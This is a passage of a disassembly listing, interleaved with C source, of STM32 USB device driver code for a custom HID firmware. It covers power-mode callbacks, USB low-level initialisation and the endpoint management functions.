    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c900:	4b04      	ldr	r3, [pc, #16]	; (800c914 <HAL_PCD_SuspendCallback+0x30>)
 800c902:	691b      	ldr	r3, [r3, #16]
 800c904:	4a03      	ldr	r2, [pc, #12]	; (800c914 <HAL_PCD_SuspendCallback+0x30>)
 800c906:	f043 0306 	orr.w	r3, r3, #6
 800c90a:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800c90c:	bf00      	nop
 800c90e:	3708      	adds	r7, #8
 800c910:	46bd      	mov	sp, r7
 800c912:	bd80      	pop	{r7, pc}
 800c914:	e000ed00 	.word	0xe000ed00

0800c918 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c918:	b580      	push	{r7, lr}
 800c91a:	b082      	sub	sp, #8
 800c91c:	af00      	add	r7, sp, #0
 800c91e:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800c920:	687b      	ldr	r3, [r7, #4]
 800c922:	699b      	ldr	r3, [r3, #24]
 800c924:	2b00      	cmp	r3, #0
 800c926:	d007      	beq.n	800c938 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c928:	4b08      	ldr	r3, [pc, #32]	; (800c94c <HAL_PCD_ResumeCallback+0x34>)
 800c92a:	691b      	ldr	r3, [r3, #16]
 800c92c:	4a07      	ldr	r2, [pc, #28]	; (800c94c <HAL_PCD_ResumeCallback+0x34>)
 800c92e:	f023 0306 	bic.w	r3, r3, #6
 800c932:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800c934:	f000 faf0 	bl	800cf18 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800c938:	687b      	ldr	r3, [r7, #4]
 800c93a:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c93e:	4618      	mov	r0, r3
 800c940:	f7fe fd12 	bl	800b368 <USBD_LL_Resume>
}
 800c944:	bf00      	nop
 800c946:	3708      	adds	r7, #8
 800c948:	46bd      	mov	sp, r7
 800c94a:	bd80      	pop	{r7, pc}
 800c94c:	e000ed00 	.word	0xe000ed00

0800c950 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800c950:	b580      	push	{r7, lr}
 800c952:	b082      	sub	sp, #8
 800c954:	af00      	add	r7, sp, #0
 800c956:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800c958:	f7f6 ff42 	bl	80037e0 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800c95c:	4a26      	ldr	r2, [pc, #152]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c95e:	687b      	ldr	r3, [r7, #4]
 800c960:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800c964:	687b      	ldr	r3, [r7, #4]
 800c966:	4a24      	ldr	r2, [pc, #144]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c968:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800c96c:	4b22      	ldr	r3, [pc, #136]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c96e:	4a23      	ldr	r2, [pc, #140]	; (800c9fc <USBD_LL_Init+0xac>)
 800c970:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800c972:	4b21      	ldr	r3, [pc, #132]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c974:	2208      	movs	r2, #8
 800c976:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800c978:	4b1f      	ldr	r3, [pc, #124]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c97a:	2202      	movs	r2, #2
 800c97c:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800c97e:	4b1e      	ldr	r3, [pc, #120]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c980:	2202      	movs	r2, #2
 800c982:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800c984:	4b1c      	ldr	r3, [pc, #112]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c986:	2200      	movs	r2, #0
 800c988:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800c98a:	4b1b      	ldr	r3, [pc, #108]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c98c:	2200      	movs	r2, #0
 800c98e:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800c990:	4b19      	ldr	r3, [pc, #100]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c992:	2200      	movs	r2, #0
 800c994:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800c996:	4b18      	ldr	r3, [pc, #96]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c998:	2200      	movs	r2, #0
 800c99a:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800c99c:	4816      	ldr	r0, [pc, #88]	; (800c9f8 <USBD_LL_Init+0xa8>)
 800c99e:	f7f5 f8e7 	bl	8001b70 <HAL_PCD_Init>
 800c9a2:	4603      	mov	r3, r0
 800c9a4:	2b00      	cmp	r3, #0
 800c9a6:	d001      	beq.n	800c9ac <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800c9a8:	f7f4 f90e 	bl	8000bc8 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800c9ac:	687b      	ldr	r3, [r7, #4]
 800c9ae:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800c9b2:	2318      	movs	r3, #24
 800c9b4:	2200      	movs	r2, #0
 800c9b6:	2100      	movs	r1, #0
 800c9b8:	f7f6 fe31 	bl	800361e <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800c9bc:	687b      	ldr	r3, [r7, #4]
 800c9be:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800c9c2:	2358      	movs	r3, #88	; 0x58
 800c9c4:	2200      	movs	r2, #0
 800c9c6:	2180      	movs	r1, #128	; 0x80
 800c9c8:	f7f6 fe29 	bl	800361e <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800c9cc:	687b      	ldr	r3, [r7, #4]
 800c9ce:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800c9d2:	2398      	movs	r3, #152	; 0x98
 800c9d4:	2200      	movs	r2, #0
 800c9d6:	2181      	movs	r1, #129	; 0x81
 800c9d8:	f7f6 fe21 	bl	800361e <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800c9dc:	687b      	ldr	r3, [r7, #4]
 800c9de:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800c9e2:	23d8      	movs	r3, #216	; 0xd8
 800c9e4:	2200      	movs	r2, #0
 800c9e6:	2101      	movs	r1, #1
 800c9e8:	f7f6 fe19 	bl	800361e <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800c9ec:	2300      	movs	r3, #0
}
 800c9ee:	4618      	mov	r0, r3
 800c9f0:	3708      	adds	r7, #8
 800c9f2:	46bd      	mov	sp, r7
 800c9f4:	bd80      	pop	{r7, pc}
 800c9f6:	bf00      	nop
 800c9f8:	20000b7c 	.word	0x20000b7c
 800c9fc:	40006800 	.word	0x40006800

0800ca00 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800ca00:	b580      	push	{r7, lr}
 800ca02:	b084      	sub	sp, #16
 800ca04:	af00      	add	r7, sp, #0
 800ca06:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ca08:	2300      	movs	r3, #0
 800ca0a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ca0c:	2300      	movs	r3, #0
 800ca0e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800ca10:	687b      	ldr	r3, [r7, #4]
 800ca12:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ca16:	4618      	mov	r0, r3
 800ca18:	f7f5 f9b0 	bl	8001d7c <HAL_PCD_Start>
 800ca1c:	4603      	mov	r3, r0
 800ca1e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ca20:	7bbb      	ldrb	r3, [r7, #14]
 800ca22:	2b03      	cmp	r3, #3
 800ca24:	d816      	bhi.n	800ca54 <USBD_LL_Start+0x54>
 800ca26:	a201      	add	r2, pc, #4	; (adr r2, 800ca2c <USBD_LL_Start+0x2c>)
 800ca28:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ca2c:	0800ca3d 	.word	0x0800ca3d
 800ca30:	0800ca43 	.word	0x0800ca43
 800ca34:	0800ca49 	.word	0x0800ca49
 800ca38:	0800ca4f 	.word	0x0800ca4f
    case HAL_OK :
      usb_status = USBD_OK;
 800ca3c:	2300      	movs	r3, #0
 800ca3e:	73fb      	strb	r3, [r7, #15]
    break;
 800ca40:	e00b      	b.n	800ca5a <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ca42:	2303      	movs	r3, #3
 800ca44:	73fb      	strb	r3, [r7, #15]
    break;
 800ca46:	e008      	b.n	800ca5a <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ca48:	2301      	movs	r3, #1
 800ca4a:	73fb      	strb	r3, [r7, #15]
    break;
 800ca4c:	e005      	b.n	800ca5a <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ca4e:	2303      	movs	r3, #3
 800ca50:	73fb      	strb	r3, [r7, #15]
    break;
 800ca52:	e002      	b.n	800ca5a <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800ca54:	2303      	movs	r3, #3
 800ca56:	73fb      	strb	r3, [r7, #15]
    break;
 800ca58:	bf00      	nop
  }
  return usb_status;
 800ca5a:	7bfb      	ldrb	r3, [r7, #15]
}
 800ca5c:	4618      	mov	r0, r3
 800ca5e:	3710      	adds	r7, #16
 800ca60:	46bd      	mov	sp, r7
 800ca62:	bd80      	pop	{r7, pc}

0800ca64 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800ca64:	b580      	push	{r7, lr}
 800ca66:	b084      	sub	sp, #16
 800ca68:	af00      	add	r7, sp, #0
 800ca6a:	6078      	str	r0, [r7, #4]
 800ca6c:	4608      	mov	r0, r1
 800ca6e:	4611      	mov	r1, r2
 800ca70:	461a      	mov	r2, r3
 800ca72:	4603      	mov	r3, r0
 800ca74:	70fb      	strb	r3, [r7, #3]
 800ca76:	460b      	mov	r3, r1
 800ca78:	70bb      	strb	r3, [r7, #2]
 800ca7a:	4613      	mov	r3, r2
 800ca7c:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ca7e:	2300      	movs	r3, #0
 800ca80:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ca82:	2300      	movs	r3, #0
 800ca84:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800ca86:	687b      	ldr	r3, [r7, #4]
 800ca88:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca8c:	78bb      	ldrb	r3, [r7, #2]
 800ca8e:	883a      	ldrh	r2, [r7, #0]
 800ca90:	78f9      	ldrb	r1, [r7, #3]
 800ca92:	f7f5 fae1 	bl	8002058 <HAL_PCD_EP_Open>
 800ca96:	4603      	mov	r3, r0
 800ca98:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ca9a:	7bbb      	ldrb	r3, [r7, #14]
 800ca9c:	2b03      	cmp	r3, #3
 800ca9e:	d817      	bhi.n	800cad0 <USBD_LL_OpenEP+0x6c>
 800caa0:	a201      	add	r2, pc, #4	; (adr r2, 800caa8 <USBD_LL_OpenEP+0x44>)
 800caa2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800caa6:	bf00      	nop
 800caa8:	0800cab9 	.word	0x0800cab9
 800caac:	0800cabf 	.word	0x0800cabf
 800cab0:	0800cac5 	.word	0x0800cac5
 800cab4:	0800cacb 	.word	0x0800cacb
    case HAL_OK :
      usb_status = USBD_OK;
 800cab8:	2300      	movs	r3, #0
 800caba:	73fb      	strb	r3, [r7, #15]
    break;
 800cabc:	e00b      	b.n	800cad6 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cabe:	2303      	movs	r3, #3
 800cac0:	73fb      	strb	r3, [r7, #15]
    break;
 800cac2:	e008      	b.n	800cad6 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cac4:	2301      	movs	r3, #1
 800cac6:	73fb      	strb	r3, [r7, #15]
    break;
 800cac8:	e005      	b.n	800cad6 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800caca:	2303      	movs	r3, #3
 800cacc:	73fb      	strb	r3, [r7, #15]
    break;
 800cace:	e002      	b.n	800cad6 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cad0:	2303      	movs	r3, #3
 800cad2:	73fb      	strb	r3, [r7, #15]
    break;
 800cad4:	bf00      	nop
  }
  return usb_status;
 800cad6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cad8:	4618      	mov	r0, r3
 800cada:	3710      	adds	r7, #16
 800cadc:	46bd      	mov	sp, r7
 800cade:	bd80      	pop	{r7, pc}

0800cae0 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cae0:	b580      	push	{r7, lr}
 800cae2:	b084      	sub	sp, #16
 800cae4:	af00      	add	r7, sp, #0
 800cae6:	6078      	str	r0, [r7, #4]
 800cae8:	460b      	mov	r3, r1
 800caea:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800caec:	2300      	movs	r3, #0
 800caee:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800caf0:	2300      	movs	r3, #0
 800caf2:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800caf4:	687b      	ldr	r3, [r7, #4]
 800caf6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cafa:	78fa      	ldrb	r2, [r7, #3]
 800cafc:	4611      	mov	r1, r2
 800cafe:	4618      	mov	r0, r3
 800cb00:	f7f5 fb07 	bl	8002112 <HAL_PCD_EP_Close>
 800cb04:	4603      	mov	r3, r0
 800cb06:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb08:	7bbb      	ldrb	r3, [r7, #14]
 800cb0a:	2b03      	cmp	r3, #3
 800cb0c:	d816      	bhi.n	800cb3c <USBD_LL_CloseEP+0x5c>
 800cb0e:	a201      	add	r2, pc, #4	; (adr r2, 800cb14 <USBD_LL_CloseEP+0x34>)
 800cb10:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb14:	0800cb25 	.word	0x0800cb25
 800cb18:	0800cb2b 	.word	0x0800cb2b
 800cb1c:	0800cb31 	.word	0x0800cb31
 800cb20:	0800cb37 	.word	0x0800cb37
    case HAL_OK :
      usb_status = USBD_OK;
 800cb24:	2300      	movs	r3, #0
 800cb26:	73fb      	strb	r3, [r7, #15]
    break;
 800cb28:	e00b      	b.n	800cb42 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb2a:	2303      	movs	r3, #3
 800cb2c:	73fb      	strb	r3, [r7, #15]
    break;
 800cb2e:	e008      	b.n	800cb42 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb30:	2301      	movs	r3, #1
 800cb32:	73fb      	strb	r3, [r7, #15]
    break;
 800cb34:	e005      	b.n	800cb42 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb36:	2303      	movs	r3, #3
 800cb38:	73fb      	strb	r3, [r7, #15]
    break;
 800cb3a:	e002      	b.n	800cb42 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cb3c:	2303      	movs	r3, #3
 800cb3e:	73fb      	strb	r3, [r7, #15]
    break;
 800cb40:	bf00      	nop
  }
  return usb_status;
 800cb42:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb44:	4618      	mov	r0, r3
 800cb46:	3710      	adds	r7, #16
 800cb48:	46bd      	mov	sp, r7
 800cb4a:	bd80      	pop	{r7, pc}

0800cb4c <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cb4c:	b580      	push	{r7, lr}
 800cb4e:	b084      	sub	sp, #16
 800cb50:	af00      	add	r7, sp, #0
 800cb52:	6078      	str	r0, [r7, #4]
 800cb54:	460b      	mov	r3, r1
 800cb56:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb58:	2300      	movs	r3, #0
 800cb5a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb5c:	2300      	movs	r3, #0
 800cb5e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cb60:	687b      	ldr	r3, [r7, #4]
 800cb62:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cb66:	78fa      	ldrb	r2, [r7, #3]
 800cb68:	4611      	mov	r1, r2
 800cb6a:	4618      	mov	r0, r3
 800cb6c:	f7f5 fc66 	bl	800243c <HAL_PCD_EP_Flush>
 800cb70:	4603      	mov	r3, r0
 800cb72:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb74:	7bbb      	ldrb	r3, [r7, #14]
 800cb76:	2b03      	cmp	r3, #3
 800cb78:	d816      	bhi.n	800cba8 <USBD_LL_FlushEP+0x5c>
 800cb7a:	a201      	add	r2, pc, #4	; (adr r2, 800cb80 <USBD_LL_FlushEP+0x34>)
 800cb7c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb80:	0800cb91 	.word	0x0800cb91
 800cb84:	0800cb97 	.word	0x0800cb97
 800cb88:	0800cb9d 	.word	0x0800cb9d
 800cb8c:	0800cba3 	.word	0x0800cba3
    case HAL_OK :
      usb_status = USBD_OK;
 800cb90:	2300      	movs	r3, #0
 800cb92:	73fb      	strb	r3, [r7, #15]
    break;
 800cb94:	e00b      	b.n	800cbae <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb96:	2303      	movs	r3, #3
 800cb98:	73fb      	strb	r3, [r7, #15]
    break;
 800cb9a:	e008      	b.n	800cbae <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb9c:	2301      	movs	r3, #1
 800cb9e:	73fb      	strb	r3, [r7, #15]
    break;
 800cba0:	e005      	b.n	800cbae <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cba2:	2303      	movs	r3, #3
 800cba4:	73fb      	strb	r3, [r7, #15]
    break;
 800cba6:	e002      	b.n	800cbae <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cba8:	2303      	movs	r3, #3
 800cbaa:	73fb      	strb	r3, [r7, #15]
    break;
 800cbac:	bf00      	nop
  }
  return usb_status;
 800cbae:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbb0:	4618      	mov	r0, r3
 800cbb2:	3710      	adds	r7, #16
 800cbb4:	46bd      	mov	sp, r7
 800cbb6:	bd80      	pop	{r7, pc}

0800cbb8 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbb8:	b580      	push	{r7, lr}
 800cbba:	b084      	sub	sp, #16
 800cbbc:	af00      	add	r7, sp, #0
 800cbbe:	6078      	str	r0, [r7, #4]
 800cbc0:	460b      	mov	r3, r1
 800cbc2:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cbc4:	2300      	movs	r3, #0
 800cbc6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cbc8:	2300      	movs	r3, #0
 800cbca:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cbcc:	687b      	ldr	r3, [r7, #4]
 800cbce:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cbd2:	78fa      	ldrb	r2, [r7, #3]
 800cbd4:	4611      	mov	r1, r2
 800cbd6:	4618      	mov	r0, r3
 800cbd8:	f7f5 fb7c 	bl	80022d4 <HAL_PCD_EP_SetStall>
 800cbdc:	4603      	mov	r3, r0
 800cbde:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cbe0:	7bbb      	ldrb	r3, [r7, #14]
 800cbe2:	2b03      	cmp	r3, #3
 800cbe4:	d816      	bhi.n	800cc14 <USBD_LL_StallEP+0x5c>
 800cbe6:	a201      	add	r2, pc, #4	; (adr r2, 800cbec <USBD_LL_StallEP+0x34>)
 800cbe8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cbec:	0800cbfd 	.word	0x0800cbfd
 800cbf0:	0800cc03 	.word	0x0800cc03
 800cbf4:	0800cc09 	.word	0x0800cc09
 800cbf8:	0800cc0f 	.word	0x0800cc0f
    case HAL_OK :
      usb_status = USBD_OK;
 800cbfc:	2300      	movs	r3, #0
 800cbfe:	73fb      	strb	r3, [r7, #15]
    break;
 800cc00:	e00b      	b.n	800cc1a <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc02:	2303      	movs	r3, #3
 800cc04:	73fb      	strb	r3, [r7, #15]
    break;
 800cc06:	e008      	b.n	800cc1a <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc08:	2301      	movs	r3, #1
 800cc0a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc0c:	e005      	b.n	800cc1a <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc0e:	2303      	movs	r3, #3
 800cc10:	73fb      	strb	r3, [r7, #15]
    break;
 800cc12:	e002      	b.n	800cc1a <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc14:	2303      	movs	r3, #3
 800cc16:	73fb      	strb	r3, [r7, #15]
    break;
 800cc18:	bf00      	nop
  }
  return usb_status;
 800cc1a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc1c:	4618      	mov	r0, r3
 800cc1e:	3710      	adds	r7, #16
 800cc20:	46bd      	mov	sp, r7
 800cc22:	bd80      	pop	{r7, pc}

0800cc24 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc24:	b580      	push	{r7, lr}
 800cc26:	b084      	sub	sp, #16
 800cc28:	af00      	add	r7, sp, #0
 800cc2a:	6078      	str	r0, [r7, #4]
 800cc2c:	460b      	mov	r3, r1
 800cc2e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc30:	2300      	movs	r3, #0
 800cc32:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc34:	2300      	movs	r3, #0
 800cc36:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cc38:	687b      	ldr	r3, [r7, #4]
 800cc3a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc3e:	78fa      	ldrb	r2, [r7, #3]
 800cc40:	4611      	mov	r1, r2
 800cc42:	4618      	mov	r0, r3
 800cc44:	f7f5 fba6 	bl	8002394 <HAL_PCD_EP_ClrStall>
 800cc48:	4603      	mov	r3, r0
 800cc4a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc4c:	7bbb      	ldrb	r3, [r7, #14]
 800cc4e:	2b03      	cmp	r3, #3
 800cc50:	d816      	bhi.n	800cc80 <USBD_LL_ClearStallEP+0x5c>
 800cc52:	a201      	add	r2, pc, #4	; (adr r2, 800cc58 <USBD_LL_ClearStallEP+0x34>)
 800cc54:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc58:	0800cc69 	.word	0x0800cc69
 800cc5c:	0800cc6f 	.word	0x0800cc6f
 800cc60:	0800cc75 	.word	0x0800cc75
 800cc64:	0800cc7b 	.word	0x0800cc7b
    case HAL_OK :
      usb_status = USBD_OK;
 800cc68:	2300      	movs	r3, #0
 800cc6a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc6c:	e00b      	b.n	800cc86 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc6e:	2303      	movs	r3, #3
 800cc70:	73fb      	strb	r3, [r7, #15]
    break;
 800cc72:	e008      	b.n	800cc86 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc74:	2301      	movs	r3, #1
 800cc76:	73fb      	strb	r3, [r7, #15]
    break;
 800cc78:	e005      	b.n	800cc86 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc7a:	2303      	movs	r3, #3
 800cc7c:	73fb      	strb	r3, [r7, #15]
    break;
 800cc7e:	e002      	b.n	800cc86 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc80:	2303      	movs	r3, #3
 800cc82:	73fb      	strb	r3, [r7, #15]
    break;
 800cc84:	bf00      	nop
  }
  return usb_status;
 800cc86:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc88:	4618      	mov	r0, r3
 800cc8a:	3710      	adds	r7, #16
 800cc8c:	46bd      	mov	sp, r7
 800cc8e:	bd80      	pop	{r7, pc}

0800cc90 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc90:	b480      	push	{r7}
 800cc92:	b085      	sub	sp, #20
 800cc94:	af00      	add	r7, sp, #0
 800cc96:	6078      	str	r0, [r7, #4]
